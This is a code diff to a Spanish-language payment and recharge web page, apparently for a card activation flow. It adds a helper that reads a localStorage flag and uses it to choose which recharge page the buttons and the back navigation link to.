@@ -920,7 +920,7 @@
                     </ol>
                 </div>
 
-                <a href="recarga.html?section=mobile-payment" class="btn btn-primary">
+                <a href="#" id="validate-payment" class="btn btn-primary">
                     <svg class="icon" viewBox="0 0 24 24">
                         <path d="M17,19H7V5H17M17,1H7C5.89,1 5,1.89 5,3V21C5,22.11 5.89,23 7,23H17C18.11,23 19,22.11 19,21V3C19,1.89 18.11,1 17,1Z"/>
                     </svg>
@@ -937,11 +937,20 @@
             </p>
             <p><strong>Este es el último paso para completar tu activación al 100%</strong></p>
             <p id="current-balance" class="balance-info"></p>
-            <a href="recarga.html" class="btn btn-primary">Volver a Recarga</a>
+            <a href="#" id="return-recarga" class="btn btn-primary">Volver a Recarga</a>
         </section>
     </div>
 
     <script>
+        function getRecargaPage() {
+            try {
+                const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+                return reg.useOldRecarga ? 'recarga3.html' : 'recarga.html';
+            } catch(e) {
+                return 'recarga.html';
+            }
+        }
+
         // Configuración
         const BANK_NAME_MAP = {
             banesco: 'Banesco',
@@ -1085,12 +1094,17 @@
             if (document.referrer && document.referrer.includes(window.location.hostname)) {
                 window.history.back();
             } else {
-                window.location.href = 'recarga.html';
+                window.location.href = getRecargaPage();
             }
         }
 
         // Inicializar
         document.addEventListener('DOMContentLoaded', function() {
+            const recargaPage = getRecargaPage();
+            const validateLink = document.getElementById('validate-payment');
+            if (validateLink) validateLink.href = `${recargaPage}?section=mobile-payment`;
+            const returnLink = document.getElementById('return-recarga');
+            if (returnLink) returnLink.href = recargaPage;
             loadUserData();
             renderUI();
             getExchangeRate();
